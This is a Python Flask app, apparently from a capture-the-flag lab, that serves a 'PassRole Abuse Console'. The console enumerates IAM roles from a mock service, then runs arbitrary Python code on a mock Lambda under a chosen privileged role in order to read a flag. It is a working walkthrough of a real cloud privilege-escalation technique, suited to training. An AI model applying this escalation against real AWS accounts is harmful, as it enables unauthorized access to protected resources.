"""PassRole Abuse — enumerate roles, test PassRole, execute as privileged role."""
import os, urllib.request, urllib.parse, json
from flask import Flask, request, render_template_string

app = Flask(__name__)
IAM = os.environ.get("IAM_URL", "http://iam:5000")
LAMBDA = os.environ.get("LAMBDA_URL", "http://lambda:5000")

HTML="""<!DOCTYPE html><html><head><title>PassRole Attack</title></head><body>
<h1>PassRole Abuse Console</h1>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 1: List Roles</strong> — Enumerate IAM roles to find privileged targets.
<form method=post action=/step1><button>List Roles</button></form></div>
<div style="background:#f0f0f0;padding:10px;margin:10px 0">
<strong>Step 2: Test Lambda</strong> — Execute code with a specific role ARN.
<p><small>Try different roles from Step 1. Some roles may be blocked, others may grant access to protected resources.</small></p>
<form method=post action=/step2>
<label>Role ARN: <input name=role size=55 placeholder="arn:aws:iam::000000000000:role/AdminRole"></label><br>
<label>Python code: <input name=code size=60 placeholder="import os; print(os.environ.get('FLAG','?'))"></label><br>
<button>Invoke Lambda</button></form></div>
<pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML, output="Ready — follow the steps above")

@app.route("/step1", methods=["POST"])
def step1():
    try:
        r = urllib.request.urlopen(f"{IAM}/roles", timeout=5)
        roles = json.loads(r.read().decode())
        return render_template_string(HTML, output=f"[+] Available roles:\n{json.dumps(roles, indent=2)}\n\n[→] Look for roles with broad permissions (s3:*, iam:*, etc.) that could access the flag.")
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error: {e}")

@app.route("/step2", methods=["POST"])
def step2():
    role = request.form.get("role", "")
    code = request.form.get("code", "")
    if not role or not code:
        return render_template_string(HTML, output="Error: role ARN and code required")
    try:
        req = urllib.request.Request(f"{LAMBDA}/invoke",
            data=json.dumps({"role": role, "code": code}).encode(),
            headers={"Content-Type": "application/json"})
        r = urllib.request.urlopen(req, timeout=10)
        return render_template_string(HTML, output=f"[+] Lambda output (as {role}):\n{r.read().decode()}")
    except urllib.error.HTTPError as e:
        return render_template_string(HTML, output=f"[-] Lambda error ({e.code}): {e.read().decode()}")
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error: {e}")

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
